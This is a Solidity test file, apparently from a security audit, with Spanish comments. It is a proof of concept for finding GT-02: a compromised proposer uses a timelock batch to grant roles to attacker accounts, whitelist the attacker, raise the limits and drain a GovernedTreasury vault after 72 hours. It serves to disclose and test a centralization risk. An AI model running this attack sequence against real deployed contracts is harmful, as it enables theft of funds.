// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {GovernedTreasury} from "../../contracts/GovernedTreasury.sol";
import {PocBase} from "./PocBase.sol";

/// @title PoC GT-02: un proponente comprometido vacía la bóveda
/// @notice Hallazgo GT-02 (Media, riesgo de centralización). El proponente es el único que
///         programa y el único que ejecuta. Si nadie cancela en 72 h, se da roles, agenda su
///         dirección, sube los topes y se lleva todo.
/// @dev Este test PASA mientras el ataque funcione. Supone que el guardián no reacciona: es
///      justo el escenario que la ventana de 72 h tiene que evitar.
contract PoC_GT02_ProponenteVacia is PocBase {
    address internal attackerOp = makeAddr("atacante-operador");
    address internal attackerAp = makeAddr("atacante-aprobador");

    /// @notice Un solo scheduleBatch con cuatro cambios; a las 72 h + 1 s se ejecuta y se vacía la bóveda.
    /// @dev Usa dos cuentas del atacante porque el contrato prohíbe autoaprobarse
    ///      (SelfApprovalNotAllowed). La doble firma no frena a quien controla las dos firmas.
    function test_PoC_GT02_ProponenteSinVigilanciaVaciaLaBoveda() public {
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory payloads = new bytes[](4);
        for (uint256 i; i < 4; ++i) targets[i] = address(treasury);

        payloads[0] = abi.encodeCall(treasury.grantRole, (treasury.OPERATOR_ROLE(), attackerOp));
        payloads[1] = abi.encodeCall(treasury.grantRole, (treasury.APPROVER_ROLE(), attackerAp));
        payloads[2] = abi.encodeCall(treasury.setBeneficiary, (attacker, true));
        payloads[3] = abi.encodeCall(
            treasury.setLimits,
            (GovernedTreasury.Limits({
                perTxLimit: 10_000e18,
                dailyLimit: 10_000e18,
                approvalThreshold: 500e18,
                directDailyLimit: 1_000e18
            }))
        );

        vm.prank(proposer);
        timelock.scheduleBatch(targets, values, payloads, bytes32(0), bytes32(0), DELAY);

        // Nadie cancela. Pasan las 72 h y el mismo proponente ejecuta.
        vm.warp(block.timestamp + DELAY + 1);
        vm.prank(proposer);
        timelock.executeBatch(targets, values, payloads, bytes32(0), bytes32(0));

        // Con roles propios y topes nuevos, un solo pedido de 10.000 se aprueba y se paga.
        vm.prank(attackerOp);
        uint256 id = treasury.requestWithdrawal(attacker, INITIAL);
        vm.prank(attackerAp);
        treasury.approveWithdrawal(id);

        assertEq(token.balanceOf(attacker), INITIAL, "el atacante se llevo todo");
        assertEq(token.balanceOf(address(treasury)), 0, "la boveda quedo vacia");
    }
}
